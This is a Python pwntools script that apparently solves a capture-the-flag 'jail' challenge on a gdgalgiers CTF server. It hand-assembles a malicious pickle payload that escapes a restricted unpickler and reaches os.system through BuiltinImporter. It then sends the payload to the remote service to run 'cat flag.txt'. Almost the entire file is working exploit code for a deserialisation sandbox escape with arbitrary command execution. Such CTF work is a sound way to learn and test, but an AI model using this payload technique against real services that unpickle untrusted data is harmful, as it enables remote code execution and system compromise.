#!/usr/bin/env python3

from pwn import *
from pickle import *

HOST, PORT = "jail.chal.ctf.gdgalgiers.com", 1300
CLASS_IDX = 104 # BuiltinImporter
CMD = "cat flag.txt"

# Target payload: empty.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(104)().load_module('os').system('cat flag.txt')

# The following payload makes use of the following behavior:
# empty.__init__("foo", obj) => empty.__doc__ == obj
# So the idea is to construct the above payload step by step:
# 1. empty.__init__("x1", empty.__class__.__bases__)
# 2. empty.__init__("x2", empty.__doc__.__getitem__(0))
# 3. empty.__init__("x3", empty.__doc__.__subclasses__())
# 4. empty.__init__("x4", empty.__doc__.__getitem__(104)())
# 5. empty.__init__("x5", empty.__doc__.load_module('os'))
# 6. empty.__doc__.system("cat flag.txt")

pickle_payload = PROTO + b"\x04" + \
    GLOBAL + b"empty\n__init__\n" + \
        STRING + b"'x1'\n" + \
        GLOBAL + b"empty\n__class__.__bases__\n" + \
        TUPLE2 + REDUCE + \
    GLOBAL + b"empty\n__init__\n" + \
        STRING + b"'x2'\n" + \
        GLOBAL + b"empty\n__doc__.__getitem__\n" + \
            INT + b"0\n" + \
            TUPLE1 + REDUCE + \
        TUPLE2 + REDUCE + \
    GLOBAL + b"empty\n__init__\n" + \
        STRING + b"'x3'\n" + \
        GLOBAL + b"empty\n__doc__.__subclasses__\n" + \
            EMPTY_TUPLE + REDUCE + \
        TUPLE2 + REDUCE + \
    GLOBAL + b"empty\n__init__\n" + \
        STRING + b"'x4'\n" + \
        GLOBAL + b"empty\n__doc__.__getitem__\n" + \
            INT + f"{CLASS_IDX}\n".encode() + \
            TUPLE1 + REDUCE + EMPTY_TUPLE + REDUCE + \
        TUPLE2 + REDUCE + \
    GLOBAL + b"empty\n__init__\n" + \
        STRING + b"'x5'\n" + \
        GLOBAL + b"empty\n__doc__.load_module\n" + \
            STRING + b"'os'\n" + \
            TUPLE1 + REDUCE + \
        TUPLE2 + REDUCE + \
    GLOBAL + b"empty\n__doc__.system\n" + \
        STRING + f"'{CMD}'\n".encode() + \
            TUPLE1 + REDUCE + \
    STOP

if __name__ == "__main__":
    io = remote(HOST, PORT)
    io.recvuntil(b": ")
    payload = pickle_payload.hex()
    io.sendline(payload.encode())
    io.interactive()
